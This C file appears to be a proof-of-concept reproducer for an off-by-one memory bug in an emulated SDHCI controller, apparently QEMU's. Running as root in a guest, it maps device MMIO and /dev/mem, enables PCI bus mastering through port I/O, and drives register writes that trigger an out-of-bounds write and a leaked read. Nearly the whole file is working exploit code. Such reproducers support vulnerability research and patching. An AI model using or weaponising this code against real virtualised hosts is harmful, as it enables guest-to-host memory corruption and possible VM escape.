#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <time.h>

uint8_t *mmio_mem;
uint8_t *config_mem;
uint8_t *devmem_mem;

void die(const char *msg) {
    perror(msg);
    exit(-1);
}

void mmio_writed(uint32_t addr, uint32_t value) {
    *((uint32_t *)(mmio_mem + addr)) = value;
}

void mmio_writew(uint32_t addr, uint16_t value) {
    *((uint16_t *)(mmio_mem + addr)) = value;
}

void mmio_writeb(uint32_t addr, uint8_t value) {
    *((uint8_t *)(mmio_mem + addr)) = value;
}

uint32_t mmio_readd(uint32_t addr) {
    return *((uint32_t *)(mmio_mem + addr));
}

uint16_t mmio_readw(uint16_t addr) {
    return *((uint16_t *)(mmio_mem + addr));
}

uint8_t mmio_readb(uint8_t addr) {
    return *((uint8_t *)(mmio_mem + addr));
}

void config_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(config_mem + addr)) = value;
}

uint32_t config_read(uint32_t addr) {
    return *((uint32_t *)(config_mem + addr));
}

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)
int pagemap_fd;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    uint64_t offset;
    offset = ((uint64_t)addr >> 12) << 3;
    lseek(pagemap_fd, offset, SEEK_SET);
    read(pagemap_fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    printf("[+] gva_to_gfn 0x%lx -> 0x%lx\n", pme, gfn);
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    if (gfn == -1)
        die("[-] Physical page not present.\n");
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void *calloc_256aligned(size_t size) {
    void *ptr_virt = mmap(0, size + 256, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (ptr_virt == MAP_FAILED)
        die("[-] Mmap 256aligned buffer failed.\n");
    mlock(ptr_virt, size + 256);
    uint64_t ptr_phys = gva_to_gpa(ptr_virt);
    uint64_t __ptr_phys = (ptr_phys + 0xff) & (~(uint64_t)0xff);
    return (void *)((uint64_t)ptr_virt + (__ptr_phys - ptr_phys));
}

//
// SDHCI specific structs
//
typedef struct ADMADescr {
    uint32_t addr_and_attr;
} ADMADescr;


uint64_t admadescr0_phys = 0;

void sdhci_off_by_one_write(uint32_t value) {
    // reset
    mmio_writeb(0x2f, 0x01);

    mmio_writed(0x58, (uint32_t)admadescr0_phys);
    mmio_writew(0x2c, 0xd397);
    mmio_writed(0x28, 0x5e72c648);
    mmio_writed(0x04, 0x000035b1); 
    mmio_writed(0x0c, 0x406075a5);
    // set SDHC_DATA_AVAILABLE
    mmio_writed(0x28, 0x1fc9595d);
    mmio_writed(0x28, 0x014e9bd5);
    // write
    mmio_writed(0x20, value);
}

uint32_t sdhci_off_by_one_read() {
    // reset
    mmio_writeb(0x2f, 0x01);

    mmio_writed(0x58, (uint32_t)admadescr0_phys);
    mmio_writew(0x2c, 0xd397);
    mmio_writed(0x28, 0x5e72c648);
    mmio_writed(0x04, 0x458735b1);
    mmio_writed(0x0c, 0x406075b7);
    // set SDHC_DATA_AVAILABLE
    mmio_writed(0x28, 0x1fc9595d);
    mmio_writed(0x28, 0x014e9bd5);
    // read
    return mmio_readd(0x20);
}

int main(int argc, char **argv) {
    printf("[+]\n[+] Reproduce sdhci-00: start\n[+]\n");

    // lspci -v
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("[-] Open mmio_fd failed.\n");
    printf("[+] Open mmio_fd successful.\n");
    mmio_mem = mmap(0, 0x100, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("[-] Mmap mmio_mem failed.\n");
    printf("[+] Mmap mmio_mem at %p.\n", mmio_mem);

    pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0)
        die("[-] Open pagemap failed.\n");
    printf("[+] Open pagemap successful.\n");

    int devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    devmem_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, 0);
    if (devmem_mem == MAP_FAILED)
        die("[-] Mmap devmem_mem failed.\n");
    printf("[+] Mmap devmem_mem at %p.\n", devmem_mem);

    // we want to enable the bus master bit to enable DMA
    iopl(3);
    uint32_t command_address;
    uint32_t command_status;
    command_address = 0x80000000 | 0x0000 << 16 | 0x03 << 11 | 0x0 << 8 | 0x04;
    // read
    outl(command_address, 0xcf8);
    command_status = inl(0xcfc);
    printf("[+] ohci PCI_CONFIG.Command = 0x%x\n", (uint16_t)command_status);
    // write
    command_status |= 0x4;
    outl(command_address, 0xcf8);
    outl(command_status, 0xcfc);
    // read
    outl(command_address, 0xcf8);
    command_status = inl(0xcfc);
    printf("[+] ohci PCI_CONFIG.Command = 0x%x\n", (uint16_t)command_status);
    sleep(1);

    // GDB
    // gef config context.nb_lines_backtrace 2
    // b ../hw/sd/sdhci.c:760

    // prepare the dependent buffer
    ADMADescr *admadescr0 = (ADMADescr *)calloc_256aligned(sizeof(ADMADescr));
    admadescr0_phys = gva_to_gpa(admadescr0);
    // uint8_t *block = (uint8_t *)calloc_256aligned(0x200);
    // uint64_t block_phys = gva_to_gpa(block);
    admadescr0->addr_and_attr |= 0xcfd83000;
    admadescr0->addr_and_attr |= 0x69;

    sdhci_off_by_one_write(0xff);
    uint32_t leaked_data = sdhci_off_by_one_read();

    if (leaked_data == 0xff) {
        printf("[+]\n[+] Bingo! Got you!: leaked_data=0x%x\n[+]\n", leaked_data);
    } else {
        printf("[+]\n[+] Reproduce xhci-00: fail\n[+]\n");
    }

    return 0;
}
